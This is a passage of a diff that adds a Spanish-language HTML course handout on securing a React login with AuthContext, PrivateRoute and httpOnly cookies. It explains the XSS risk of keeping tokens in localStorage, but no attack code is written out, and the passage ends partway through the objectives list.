@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Práctica 7 — AuthContext y PrivateRoute con cookies httpOnly</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Segoe UI',Arial,sans-serif; background:#fff; color:#1a1a2e; font-size:14px; line-height:1.7; }
+.header { background:#1565C0; color:#fff; }
+.header-top { background:#0D47A1; padding:18px 40px 14px; display:flex; justify-content:space-between; align-items:flex-start; }
+.header-inst { font-size:11px; opacity:0.85; letter-spacing:0.03em; text-transform:uppercase; }
+.header-carrera { font-size:13px; font-weight:600; margin-top:3px; }
+.header-badge { background:#fff; color:#0D47A1; font-weight:700; font-size:13px; padding:6px 16px; border-radius:20px; white-space:nowrap; align-self:center; }
+.header-main { padding:20px 40px 24px; }
+.header-practica { font-size:11px; opacity:0.75; text-transform:uppercase; letter-spacing:0.08em; margin-bottom:6px; }
+.header-titulo { font-size:26px; font-weight:700; margin-bottom:8px; }
+.header-meta { display:flex; gap:24px; font-size:12px; opacity:0.85; flex-wrap:wrap; }
+.header-strip { height:5px; background:#42A5F5; }
+.content { max-width:900px; margin:0 auto; padding:36px 40px 60px; }
+.toc { background:#E3F2FD; border-left:4px solid #1565C0; border-radius:0 8px 8px 0; padding:20px 24px; margin-bottom:36px; }
+.toc-title { font-size:13px; font-weight:700; color:#0D47A1; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:12px; }
+.toc ol { padding-left:18px; }
+.toc li { font-size:13px; color:#1565C0; padding:3px 0; }
+.toc li a { color:#1565C0; text-decoration:none; }
+.toc li a:hover { text-decoration:underline; }
+.seccion { margin-bottom:36px; }
+.seccion-titulo { font-size:16px; font-weight:700; color:#0D47A1; border-bottom:2px solid #BBDEFB; padding-bottom:8px; margin-bottom:16px; display:flex; align-items:center; gap:10px; }
+.seccion-num { background:#1565C0; color:#fff; font-size:12px; font-weight:700; width:26px; height:26px; border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+.subseccion-titulo { font-size:14px; font-weight:700; color:#1565C0; margin:18px 0 8px; }
+p { margin-bottom:10px; }
+.contexto-card { background:#F8FBFF; border:1px solid #BBDEFB; border-radius:10px; padding:20px 24px; margin-bottom:16px; }
+.contexto-card p:last-child { margin-bottom:0; }
+.concepto-bloque { border:1px solid #BBDEFB; border-radius:10px; margin-bottom:14px; overflow:hidden; }
+.concepto-header { background:#1565C0; color:#fff; padding:10px 16px; font-size:13px; font-weight:700; display:flex; align-items:center; gap:8px; }
+.concepto-icon { font-size:16px; }
+.concepto-body { padding:14px 16px; font-size:13.5px; background:#F8FBFF; }
+.concepto-body p { margin-bottom:8px; }
+.concepto-body p:last-child { margin-bottom:0; }
+.analogia { background:#FFF8E1; border-left:3px solid #F59E0B; padding:10px 14px; margin-top:8px; border-radius:0 6px 6px 0; font-size:13px; }
+.analogia strong { color:#92400E; }
+.obj-lista { list-style:none; padding:0; }
+.obj-lista li { padding:6px 0 6px 24px; position:relative; font-size:13.5px; border-bottom:1px solid #F0F4FF; }
+.obj-lista li:last-child { border-bottom:none; }
+.obj-lista li::before { content:'✓'; position:absolute; left:0; color:#1565C0; font-weight:700; }
+.nota     { background:#FFF8E1; border-left:4px solid #F59E0B; border-radius:0 8px 8px 0; padding:12px 16px; margin:14px 0; font-size:13px; }
+.nota strong { color:#92400E; }
+.info     { background:#E8F5E9; border-left:4px solid #43A047; border-radius:0 8px 8px 0; padding:12px 16px; margin:14px 0; font-size:13px; }
+.info strong { color:#1B5E20; }
+.peligro  { background:#FFEBEE; border-left:4px solid #E53935; border-radius:0 8px 8px 0; padding:12px 16px; margin:14px 0; font-size:13px; }
+.peligro strong { color:#B71C1C; }
+.profesional { background:#EDE7F6; border-left:4px solid #7B1FA2; border-radius:0 8px 8px 0; padding:12px 16px; margin:14px 0; font-size:13px; }
+.profesional strong { color:#4A148C; }
+.seguridad { background:#FFF3E0; border-left:4px solid #E65100; border-radius:0 8px 8px 0; padding:12px 16px; margin:14px 0; font-size:13px; }
+.seguridad strong { color:#E65100; }
+.flujo { display:flex; align-items:center; margin:16px 0; flex-wrap:wrap; }
+.flujo-item { background:#E3F2FD; border:1px solid #90CAF9; border-radius:8px; padding:10px 16px; text-align:center; font-size:12px; flex:1; min-width:100px; }
+.flujo-item.activo { background:#1565C0; color:#fff; border-color:#1565C0; font-weight:700; }
+.flujo-item.futuro { background:#F5F5F5; border-color:#ddd; color:#999; }
+.flujo-item.listo  { background:#E8F5E9; border-color:#66BB6A; color:#2E7D32; }
+.flujo-item .fi-num { font-size:10px; opacity:0.7; margin-bottom:2px; }
+.flujo-item .fi-nombre { font-size:12px; font-weight:600; }
+.flujo-sep { color:#90CAF9; font-size:18px; padding:0 6px; }
+.paso { background:#fff; border:1px solid #BBDEFB; border-radius:10px; padding:20px 24px; margin-bottom:20px; }
+.paso-header { display:flex; align-items:center; gap:12px; margin-bottom:14px; }
+.paso-num { background:#1565C0; color:#fff; font-size:13px; font-weight:700; padding:4px 12px; border-radius:14px; }
+.paso-titulo { font-size:14px; font-weight:700; color:#0D47A1; }
+.paso p { font-size:13.5px; margin-bottom:10px; }
+.file-label { display:inline-block; background:#E3F2FD; color:#0D47A1; font-family:'Courier New',monospace; font-size:12px; padding:4px 12px; border-radius:6px 6px 0 0; border:1px solid #BBDEFB; border-bottom:none; font-weight:600; margin-top:10px; }
+.file-label.nuevo { background:#E8F5E9; color:#1B5E20; border-color:#A5D6A7; }
+.file-label.modif { background:#FFF8E1; color:#92400E; border-color:#FFE082; }
+.code-wrap { border:1px solid #BBDEFB; border-radius:0 8px 8px 8px; overflow:hidden; margin-bottom:12px; background:#fff; }
+.code-wrap.nuevo { border-color:#A5D6A7; }
+.code-wrap.modif { border-color:#FFE082; }
+.code-wrap canvas { display:block; max-width:100%; }
+.folder-tree { background:#fff; border:1px solid #BBDEFB; border-radius:8px; padding:16px 20px; margin:12px 0; font-family:'Courier New',monospace; font-size:13px; line-height:2.1; }
+.folder-tree .d { color:#1565C0; font-weight:700; }
+.folder-tree .f { color:#2E7D32; }
+.folder-tree .f-nuevo { color:#2E7D32; font-weight:700; background:#E8F5E9; padding:1px 4px; border-radius:3px; }
+.folder-tree .f-modif { color:#92400E; font-weight:700; background:#FFF8E1; padding:1px 4px; border-radius:3px; }
+.folder-tree .cm { color:#9E9E9E; font-style:italic; }
+.tabla-gen { width:100%; border-collapse:collapse; font-size:13px; margin:12px 0; }
+.tabla-gen th { background:#1565C0; color:#fff; padding:9px 14px; text-align:left; font-size:12px; }
+.tabla-gen td { padding:9px 14px; border-bottom:1px solid #E3F2FD; vertical-align:top; }
+.tabla-gen tr:nth-child(even) td { background:#F8FBFF; }
+.tabla-gen code { background:#E3F2FD; color:#0D47A1; padding:1px 6px; border-radius:3px; font-size:12px; }
+.actividades { width:100%; border-collapse:collapse; font-size:13px; margin:14px 0; }
+.actividades th { background:#1565C0; color:#fff; padding:10px 14px; text-align:left; font-weight:600; font-size:12px; }
+.actividades td { padding:9px 14px; border-bottom:1px solid #E3F2FD; vertical-align:top; }
+.actividades tr:nth-child(even) td { background:#F8FBFF; }
+.actividades tr:last-child td { border-bottom:none; }
+.tipo-badge { font-size:11px; padding:3px 8px; border-radius:10px; font-weight:600; white-space:nowrap; }
+.tipo-codigo  { background:#E3F2FD; color:#0D47A1; }
+.tipo-prueba  { background:#E8F5E9; color:#1B5E20; }
+.tipo-thunder { background:#FFF3E0; color:#E65100; }
+.reflexion-lista { list-style:none; padding:0; counter-reset:ref; }
+.reflexion-lista li { counter-increment:ref; padding:10px 14px 10px 44px; position:relative; background:#F8FBFF; border:1px solid #BBDEFB; border-radius:8px; margin-bottom:8px; font-size:13.5px; }
+.reflexion-lista li::before { content:counter(ref); position:absolute; left:12px; top:50%; transform:translateY(-50%); background:#1565C0; color:#fff; width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:11px; font-weight:700; }
+.rubrica { width:100%; border-collapse:collapse; font-size:13px; margin:14px 0; }
+.rubrica th { background:#0D47A1; color:#fff; padding:10px 14px; text-align:left; font-weight:600; font-size:12px; }
+.rubrica td { padding:9px 14px; border-bottom:1px solid #E3F2FD; }
+.rubrica tr:nth-child(even) td { background:#F8FBFF; }
+.rubrica .total td { background:#1565C0; color:#fff; font-weight:700; }
+.pts { font-weight:700; color:#0D47A1; }
+.entregable-lista { list-style:none; padding:0; }
+.entregable-lista li { padding:8px 14px 8px 36px; position:relative; font-size:13.5px; border-bottom:1px solid #F0F4FF; }
+.entregable-lista li:last-child { border-bottom:none; }
+.entregable-lista li::before { content:'📄'; position:absolute; left:8px; }
+.footer { background:#0D47A1; color:#fff; text-align:center; padding:14px 40px; font-size:12px; margin-top:40px; }
+code { background:#E3F2FD; color:#0D47A1; padding:1px 5px; border-radius:3px; font-size:12px; font-family:'Courier New',monospace; }
+.comp-tabla { width:100%; border-collapse:collapse; font-size:13px; margin:14px 0; border-radius:8px; overflow:hidden; }
+.comp-tabla th { padding:10px 14px; font-size:12px; font-weight:700; text-align:left; }
+.comp-tabla td { padding:10px 14px; border-bottom:1px solid #E3F2FD; font-size:13px; vertical-align:top; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-top">
+    <div>
+      <div class="header-inst">Ingeniería de Desarrollo y Gestión de Software</div>
+      <div class="header-carrera">Desarrollo Web Integral y Seguridad</div>
+    </div>
+    <div class="header-badge">Práctica 7</div>
+  </div>
+  <div class="header-main">
+    <div class="header-practica">Fase 3 — Autenticación · cierre</div>
+    <div class="header-titulo">AuthContext y PrivateRoute con cookies httpOnly</div>
+    <div class="header-meta">
+      <span>⏱ Duración: 2 horas</span>
+      <span>🔐 Cookies httpOnly · Context API · PrivateRoute · cookie-parser</span>
+      <span>📦 Entregable: login seguro y rutas protegidas en React</span>
+    </div>
+  </div>
+  <div class="header-strip"></div>
+</div>
+
+<div class="content">
+
+  <div class="toc">
+    <div class="toc-title">Tabla de contenidos</div>
+    <ol>
+      <li><a href="#donde">¿Dónde estamos en el proyecto?</a></li>
+      <li><a href="#conceptos">Cookies httpOnly vs localStorage — por qué importa</a></li>
+      <li><a href="#objetivos">Objetivos de la práctica</a></li>
+      <li><a href="#estructura">Cambios en backend y frontend</a></li>
+      <li><a href="#desarrollo">Desarrollo paso a paso</a></li>
+      <li><a href="#actividades">Actividades</a></li>
+      <li><a href="#reflexion">Preguntas de reflexión</a></li>
+      <li><a href="#entregable">Entregable</a></li>
+      <li><a href="#rubrica">Criterios de evaluación</a></li>
+    </ol>
+  </div>
+
+  <!-- 1. DÓNDE ESTAMOS -->
+  <div class="seccion" id="donde">
+    <div class="seccion-titulo"><span class="seccion-num">1</span> ¿Dónde estamos en el proyecto?</div>
+
+    <div class="contexto-card">
+      <p>En la Práctica 6 protegimos el backend con JWT y bcrypt. El backend ya rechaza peticiones sin token. En esta práctica cerramos la Fase 3 del lado del cliente: crearemos la <strong>pantalla de login</strong>, el <strong>AuthContext</strong> para compartir el estado de sesión, y el componente <strong>PrivateRoute</strong> que redirige al login si no hay sesión.</p>
+      <p>La diferencia respecto a cómo suele enseñarse este tema: <strong>usaremos cookies httpOnly en lugar de localStorage</strong> para guardar el token. Esto no es una complicación extra — es la forma correcta desde el principio.</p>
+    </div>
+
+    <div class="flujo">
+      <div class="flujo-item listo"><div class="fi-num">P01–P05</div><div class="fi-nombre">BD + API + Frontend</div></div>
+      <div class="flujo-sep">→</div>
+      <div class="flujo-item listo"><div class="fi-num">P06</div><div class="fi-nombre">JWT backend</div></div>
+      <div class="flujo-sep">→</div>
+      <div class="flujo-item activo"><div class="fi-num">P07</div><div class="fi-nombre">AuthContext + cookies</div></div>
+      <div class="flujo-sep">→</div>
+      <div class="flujo-item futuro"><div class="fi-num">P08–P10</div><div class="fi-nombre">Módulos CRUD</div></div>
+      <div class="flujo-sep">→</div>
+      <div class="flujo-item futuro"><div class="fi-num">P11–P13</div><div class="fi-nombre">Avanzado</div></div>
+    </div>
+
+    <!-- MAPA DE PANTALLAS -->
+    <div class="subseccion-titulo">Mapa de pantallas del sistema al terminar P07</div>
+    <p>Este es el mapa completo de navegación. Las flechas muestran cómo el usuario se mueve entre pantallas y qué las dispara.</p>
+    <div style="background:#F8FBFF;border:1px solid #BBDEFB;border-radius:12px;padding:20px;margin:14px 0;overflow-x:auto;">
+      <svg viewBox="0 0 860 520" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:860px;display:block;margin:0 auto;font-family:'Segoe UI',Arial,sans-serif;">
+        <defs>
+          <marker id="arr"       markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#1565C0"/></marker>
+          <marker id="arr-red"   markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#E53935"/></marker>
+          <marker id="arr-green" markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#2E7D32"/></marker>
+          <marker id="arr-gray"  markerWidth="8" markerHeight="8" refX="7" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#888"/></marker>
+        </defs>
+        <!-- NAVBAR -->
+        <rect x="20" y="16" width="820" height="28" rx="5" fill="#1565C0"/>
+        <text x="36" y="34" fill="#fff" font-size="11" font-weight="700">🖥️  NAVBAR — aparece en todas las pantallas privadas</text>
+        <text x="660" y="34" fill="#90CAF9" font-size="10">👤 usuario · rol · [Cerrar sesión]</text>
+        <!-- LOGIN -->
+        <rect x="20" y="60" width="200" height="185" rx="10" fill="#fff" stroke="#1565C0" stroke-width="2"/>
+        <rect x="20" y="60" width="200" height="32" rx="10" fill="#1565C0"/>
+        <rect x="20" y="80" width="200" height="12" fill="#1565C0"/>
+        <text x="120" y="81" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">🔑 /login</text>
+        <text x="120" y="95" text-anchor="middle" fill="#BBDEFB" font-size="9">Pantalla pública</text>
+        <rect x="36" y="108" width="168" height="20" rx="4" fill="#F8FBFF" stroke="#BBDEFB"/>
+        <text x="44" y="122" fill="#888" font-size="9">Usuario</text>
+        <rect x="36" y="134" width="168" height="20" rx="4" fill="#F8FBFF" stroke="#BBDEFB"/>
+        <text x="44" y="148" fill="#888" font-size="9">Contraseña  ••••••••</text>
+        <rect x="36" y="164" width="168" height="24" rx="5" fill="#1565C0"/>
+        <text x="120" y="180" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">Iniciar sesión</text>
+        <rect x="36" y="198" width="168" height="16" rx="4" fill="#FFEBEE" stroke="#FFCDD2"/>
+        <text x="120" y="210" text-anchor="middle" fill="#C62828" font-size="9">❌ Credenciales incorrectas</text>
+        <text x="120" y="235" text-anchor="middle" fill="#888" font-size="9" font-style="italic">Cookie httpOnly se crea en el servidor</text>
+        <!-- PERSONAS LIST -->
+        <rect x="300" y="60" width="260" height="250" rx="10" fill="#fff" stroke="#1565C0" stroke-width="2"/>
+        <rect x="300" y="60" width="260" height="32" rx="10" fill="#1565C0"/>
+        <rect x="300" y="80" width="260" height="12" fill="#1565C0"/>
+        <text x="430" y="81" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">📋 /personas</text>
+        <text x="430" y="95" text-anchor="middle" fill="#BBDEFB" font-size="9">🔒 Ruta privada — requiere sesión</text>
+        <rect x="316" y="106" width="228" height="18" rx="3" fill="#BBDEFB"/>
+        <text x="330" y="119" fill="#0D47A1" font-size="8" font-weight="700">#   Nombre         Correo        Acciones</text>
+        <rect x="316" y="126" width="228" height="16" rx="2" fill="#F8FBFF"/>
+        <text x="322" y="138" fill="#333" font-size="8">1   Ana García      ana@...       ✏️ 🗑️</text>
+        <rect x="316" y="144" width="228" height="16" rx="2" fill="#fff"/>
+        <text x="322" y="156" fill="#333" font-size="8">2   Luis Martínez   luis@...      ✏️ 🗑️</text>
+        <rect x="316" y="162" width="228" height="16" rx="2" fill="#F8FBFF"/>
+        <text x="322" y="174" fill="#333" font-size="8">3   María Torres    maria@...     ✏️ 🗑️</text>
+        <rect x="316" y="180" width="228" height="16" rx="2" fill="#fff"/>
+        <text x="322" y="192" fill="#333" font-size="8">4   Carlos Mendoza  carlos@...    ✏️ 🗑️</text>
+        <rect x="316" y="210" width="115" height="22" rx="5" fill="#1565C0"/>
+        <text x="373" y="225" text-anchor="middle" fill="#fff" font-size="9" font-weight="700">➕ Nueva persona</text>
+        <text x="430" y="262" text-anchor="middle" fill="#888" font-size="9" font-style="italic">Cookie viaja automáticamente en</text>
+        <text x="430" y="275" text-anchor="middle" fill="#888" font-size="9" font-style="italic">cada petición — sin código extra</text>
+        <text x="430" y="290" text-anchor="middle" fill="#888" font-size="9" font-style="italic">Pantalla principal del sistema</text>
+        <!-- NUEVA PERSONA -->
+        <rect x="620" y="60" width="220" height="225" rx="10" fill="#fff" stroke="#2E7D32" stroke-width="2"/>
+        <rect x="620" y="60" width="220" height="32" rx="10" fill="#2E7D32"/>
+        <rect x="620" y="80" width="220" height="12" fill="#2E7D32"/>
+        <text x="730" y="81" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">➕ /personas/nueva</text>
+        <text x="730" y="95" text-anchor="middle" fill="#A5D6A7" font-size="9">🔒 Ruta privada</text>
+        <rect x="636" y="118" width="188" height="16" rx="3" fill="#F8FBFF" stroke="#BBDEFB"/>
+        <text x="642" y="130" fill="#888" font-size="8">Nombre *</text>
+        <rect x="636" y="138" width="188" height="16" rx="3" fill="#F8FBFF" stroke="#BBDEFB"/>
+        <text x="642" y="150" fill="#888" font-size="8">Correo *</text>
+        <rect x="636" y="158" width="90" height="16" rx="3" fill="#F8FBFF" stroke="#BBDEFB"/>
+        <text x="642" y="170" fill="#888" font-size="8">Teléfono</text>
+        <rect x="732" y="158" width="92" height="16" rx="3" fill="#F8FBFF" stroke="#BBDEFB"/>
+        <text x="738" y="170" fill="#888" font-size="8">Puesto</text>
+        <rect x="636" y="178" width="188" height="16" rx="3" fill="#F8FBFF" stroke="#BBDEFB"/>
+        <text x="642" y="190" fill="#888" font-size="8">Departamento</text>
+        <rect x="636" y="204" width="90" height="20" rx="5" fill="#1565C0"/>
+        <text x="681" y="218" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">Crear persona</text>
+        <rect x="732" y="204" width="92" height="20" rx="5" fill="#fff" stroke="#BBDEFB"/>
+        <text x="778" y="218" text-anchor="middle" fill="#888" font-size="8">Cancelar</text>
+        <text x="730" y="258" text-anchor="middle" fill="#888" font-size="9" font-style="italic">Al guardar → vuelve a /personas</text>
+        <text x="730" y="272" text-anchor="middle" fill="#888" font-size="9" font-style="italic">Al cancelar → vuelve a /personas</text>
+        <!-- EDITAR PERSONA -->
+        <rect x="620" y="330" width="220" height="185" rx="10" fill="#fff" stroke="#E65100" stroke-width="2"/>
+        <rect x="620" y="330" width="220" height="32" rx="10" fill="#E65100"/>
+        <rect x="620" y="350" width="220" height="12" fill="#E65100"/>
+        <text x="730" y="351" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">✏️ /personas/editar/:id</text>
+        <text x="730" y="365" text-anchor="middle" fill="#FFCCBC" font-size="9">🔒 Ruta privada</text>
+        <rect x="636" y="380" width="188" height="16" rx="3" fill="#FFF8E1" stroke="#FFE082"/>
+        <text x="642" y="392" fill="#555" font-size="8">Ana García López</text>
+        <rect x="636" y="400" width="188" height="16" rx="3" fill="#FFF8E1" stroke="#FFE082"/>
+        <text x="642" y="412" fill="#555" font-size="8">ana.garcia@empresa.com</text>
+        <rect x="636" y="420" width="188" height="16" rx="3" fill="#FFF8E1" stroke="#FFE082"/>
+        <text x="642" y="432" fill="#555" font-size="8">Coordinadora · Sistemas</text>
+        <rect x="636" y="448" width="90" height="20" rx="5" fill="#1565C0"/>
+        <text x="681" y="462" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">Guardar cambios</text>
+        <rect x="732" y="448" width="92" height="20" rx="5" fill="#fff" stroke="#BBDEFB"/>
+        <text x="778" y="462" text-anchor="middle" fill="#888" font-size="8">Cancelar</text>
+        <text x="730" y="498" text-anchor="middle" fill="#888" font-size="9" font-style="italic">Formulario pre-llenado</text>
+        <!-- 404 -->
+        <rect x="300" y="370" width="200" height="120" rx="10" fill="#fff" stroke="#9E9E9E" stroke-width="2" stroke-dasharray="6,3"/>
+        <rect x="300" y="370" width="200" height="32" rx="10" fill="#9E9E9E"/>
+        <rect x="300" y="390" width="200" height="12" fill="#9E9E9E"/>
+        <text x="400" y="391" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">🔍 /* (URL no existe)</text>
+        <text x="400" y="425" text-anchor="middle" fill="#444" font-size="20">🔍</text>
+        <text x="400" y="447" text-anchor="middle" fill="#555" font-size="10" font-weight="700">Página no encontrada</text>
+        <rect x="340" y="458" width="120" height="20" rx="5" fill="#1565C0"/>
+        <text x="400" y="472" text-anchor="middle" fill="#fff" font-size="9" font-weight="700">← Volver al inicio</text>
+        <!-- FLECHAS -->
+        <line x1="220" y1="158" x2="298" y2="158" stroke="#2E7D32" stroke-width="2" marker-end="url(#arr-green)"/>
+        <text x="256" y="152" text-anchor="middle" fill="#2E7D32" font-size="8" font-weight="700">Login OK ✓</text>
+        <path d="M300,108 Q260,72 222,100" stroke="#E53935" stroke-width="1.5" stroke-dasharray="5,3" fill="none" marker-end="url(#arr-red)"/>
+        <text x="244" y="72" text-anchor="middle" fill="#E53935" font-size="8">Sin sesión</text>
+        <text x="244" y="82" text-anchor="middle" fill="#E53935" font-size="8">→ redirige</text>
+        <line x1="560" y1="128" x2="618" y2="128" stroke="#1565C0" stroke-width="1.5" marker-end="url(#arr)"/>
+        <text x="589" y="122" text-anchor="middle" fill="#1565C0" font-size="8">Nueva</text>
+        <text x="589" y="132" text-anchor="middle" fill="#1565C0" font-size="8">persona</text>
+        <path d="M560,190 Q595,190 595,330 Q595,390 618,390" stroke="#1565C0" stroke-width="1.5" fill="none" marker-end="url(#arr)"/>
+        <text x="601" y="290" fill="#1565C0" font-size="8">Clic ✏️</text>
+        <path d="M730,285 Q730,308 600,250 Q540,220 560,210" stroke="#888" stroke-width="1.5" stroke-dasharray="4,3" fill="none" marker-end="url(#arr-gray)"/>
+        <text x="665" y="302" text-anchor="middle" fill="#888" font-size="8">Guardar / Cancelar</text>
+        <path d="M620,430 Q555,430 555,310 Q555,220 560,215" stroke="#888" stroke-width="1.5" stroke-dasharray="4,3" fill="none" marker-end="url(#arr-gray)"/>
+        <path d="M500,200 Q538,200 538,390 Q538,408 502,408" stroke="#9E9E9E" stroke-width="1.5" stroke-dasharray="4,3" fill="none" marker-end="url(#arr-gray)"/>
+        <text x="548" y="360" fill="#9E9E9E" font-size="8">URL</text>
+        <text x="548" y="370" fill="#9E9E9E" font-size="8">no existe</text>
+        <path d="M300,38 Q120,38 120,58" stroke="#E53935" stroke-width="1.5" stroke-dasharray="5,3" fill="none" marker-end="url(#arr-red)"/>
+        <text x="200" y="32" text-anchor="middle" fill="#E53935" font-size="8">Cerrar sesión (borra cookie)</text>
+        <!-- LEYENDA -->
+        <rect x="20" y="460" width="262" height="54" rx="8" fill="#F8FBFF" stroke="#BBDEFB"/>
+        <text x="30" y="477" fill="#333" font-size="10" font-weight="700">Leyenda</text>
+        <line x1="30" y1="490" x2="60" y2="490" stroke="#2E7D32" stroke-width="2" marker-end="url(#arr-green)"/>
+        <text x="66" y="494" fill="#333" font-size="9">Navegación exitosa</text>
+        <line x1="30" y1="505" x2="60" y2="505" stroke="#E53935" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arr-red)"/>
+        <text x="66" y="509" fill="#333" font-size="9">Redirección automática (sin sesión / logout)</text>
+        <line x1="162" y1="490" x2="192" y2="490" stroke="#888" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#arr-gray)"/>
+        <text x="198" y="494" fill="#333" font-size="9">Volver al completar / cancelar</text>
+      </svg>
+    </div>
+    <div class="info">
+      <strong>📌 Lo nuevo en P07</strong> es la pantalla de <strong>Login</strong> y la lógica de sesión con <strong>cookies httpOnly</strong>. Las demás pantallas ya existían desde P04–P05. Al terminar, ninguna ruta privada es accesible sin sesión activa.
+    </div>
+  </div>
+
+  <!-- 2. CONCEPTOS -->
+  <div class="seccion" id="conceptos">
+    <div class="seccion-titulo"><span class="seccion-num">2</span> Cookies httpOnly vs localStorage — por qué importa</div>
+
+    <div class="concepto-bloque">
+      <div class="concepto-header"><span class="concepto-icon">⚠️</span> El problema de guardar el token en localStorage</div>
+      <div class="concepto-body">
+        <p>Muchos tutoriales guardan el JWT en <code>localStorage</code> porque es simple. El problema es que localStorage es <strong>accesible desde cualquier JavaScript que corra en la página</strong>. Si tu aplicación tiene una vulnerabilidad XSS (Cross-Site Scripting) — donde un atacante logra ejecutar código JavaScript malicioso — ese código puede hacer esto:</p>
+        <div class="file-label" style="margin-top:8px;">Ataque XSS — lo que un script malicioso puede hacer con localStorage</div>
+        <div class="code-wrap"><canvas id="c_xss"></canvas></div>
+        <p>Con una sola línea el atacante roba el token y puede hacerse pasar por el usuario en cualquier petición a la API.</p>
+      </div>
+    </div>
+
+    <div class="concepto-bloque">
+      <div class="concepto-header"><span class="concepto-icon">🍪</span> ¿Qué es una cookie httpOnly y cómo protege el token?</div>
+      <div class="concepto-body">
+        <p>Una <strong>cookie httpOnly</strong> es una cookie que el servidor crea con el atributo <code>httpOnly: true</code>. Esto le dice al navegador: <em>"esta cookie es solo para ti — no la expongas a JavaScript"</em>. Aunque un atacante inyecte código malicioso en la página, <code>document.cookie</code> y cualquier otro método de JavaScript <strong>no pueden leer esa cookie</strong>.</p>
+        <p>Adicionalmente usamos dos atributos más:</p>
+        <table class="tabla-gen">
+          <thead><tr><th>Atributo</th><th>¿Qué hace?</th></tr></thead>
+          <tbody>
+            <tr><td><code>httpOnly: true</code></td><td>JavaScript no puede leer ni modificar la cookie. Solo viaja en las peticiones HTTP.</td></tr>
+            <tr><td><code>sameSite: 'strict'</code></td><td>La cookie solo se envía en peticiones que originan del mismo sitio. Protege contra CSRF.</td></tr>
+            <tr><td><code>secure: true</code></td><td>La cookie solo viaja por HTTPS. En desarrollo lo dejamos en <code>false</code> porque usamos HTTP local.</td></tr>
+            <tr><td><code>maxAge</code></td><td>Tiempo de vida en segundos. Después de ese tiempo el navegador borra la cookie automáticamente.</td></tr>
+          </tbody>
+        </table>
+        <div class="analogia"><strong>Analogía:</strong> localStorage es como dejar tu llave de casa en el felpudo — cualquiera que pase puede tomarla. Una cookie httpOnly es como dejar la llave en una caja fuerte empotrada en la pared — el cartero (el navegador) la usa automáticamente para abrir la puerta, pero tú no puedes sacarla ni nadie más puede verla.</div>
+      </div>
+    </div>
+
+    <div class="concepto-bloque">
+      <div class="concepto-header"><span class="concepto-icon">🔄</span> ¿Qué cambia en el código con cookies?</div>
+      <div class="concepto-body">
+        <table class="comp-tabla">
+          <thead><tr style="background:#E3F2FD;"><th style="color:#0D47A1;padding:10px 14px;">Con localStorage (antes)</th><th style="color:#0D47A1;padding:10px 14px;">Con cookies httpOnly (ahora)</th></tr></thead>
+          <tbody>
+            <tr><td>El backend devuelve el token en el body JSON: <code>{ token: "eyJ..." }</code></td><td>El backend <strong>crea la cookie directamente</strong> con <code>res.cookie()</code>. No hay token en el JSON.</td></tr>
+            <tr><td>El frontend guarda el token: <code>localStorage.setItem('token', ...)</code></td><td>El frontend <strong>no hace nada</strong> — el navegador recibe y guarda la cookie automáticamente.</td></tr>
+            <tr><td>Axios agrega el header manualmente: <code>Authorization: Bearer token</code></td><td>El navegador envía la cookie automáticamente. Axios solo necesita <code>withCredentials: true</code>.</td></tr>
+            <tr><td>El middleware lee el header <code>Authorization</code></td><td>El middleware lee la cookie: <code>req.cookies.token</code></td></tr>
+            <tr><td>Logout: <code>localStorage.removeItem('token')</code></td><td>Logout: el backend llama a <code>res.clearCookie('token')</code></td></tr>
+          </tbody>
+        </table>
+        <div class="profesional">
+          <strong>💡 ¿Por qué necesitamos <code>withCredentials: true</code> en axios?</strong> Por defecto el navegador no envía cookies en peticiones cross-origin (de <code>localhost:5173</code> a <code>localhost:3000</code>). Con <code>withCredentials: true</code> le decimos que sí las incluya. El backend también debe tener CORS configurado con <code>credentials: true</code> y un origen específico (no <code>*</code>) para que esto funcione.
+        </div>
+      </div>
+    </div>
+
+    <div class="concepto-bloque">
+      <div class="concepto-header"><span class="concepto-icon">🌐</span> ¿Qué es la Context API de React?</div>
+      <div class="concepto-body">
+        <p>La <strong>Context API</strong> crea un "almacén global" de datos al que cualquier componente puede acceder sin necesidad de pasarlo como prop. La usaremos para compartir el estado de sesión — si hay usuario activo, quién es, qué rol tiene — en toda la aplicación.</p>
+        <div class="analogia"><strong>Analogía:</strong> La sesión del usuario es como la temperatura del edificio: todos los pisos la necesitan saber pero no tiene sentido que el piso 1 le diga al piso 5 cuánto hace. Con Context, hay un termostato central que todos consultan directamente.</div>
+      </div>
+    </div>
+
+    <div class="concepto-bloque">
+      <div class="concepto-header"><span class="concepto-icon">🚪</span> ¿Qué es PrivateRoute?</div>
+      <div class="concepto-body">
+        <p><strong>PrivateRoute</strong> es un componente que tú creas para proteger rutas. Su lógica es simple: si hay usuario en el contexto, muestra el componente. Si no hay usuario, redirige a <code>/login</code> automáticamente. Se usa envolviendo las rutas privadas en <code>App.jsx</code>.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3. OBJETIVOS -->
+  <div class="seccion" id="objetivos">
+    <div class="seccion-titulo"><span class="seccion-num">3</span> Objetivos de la práctica</div>
+    <ul class="obj-lista">
+      <li>Instalar <code>cookie-parser</code> en el backend y configurarlo en Express.</li>
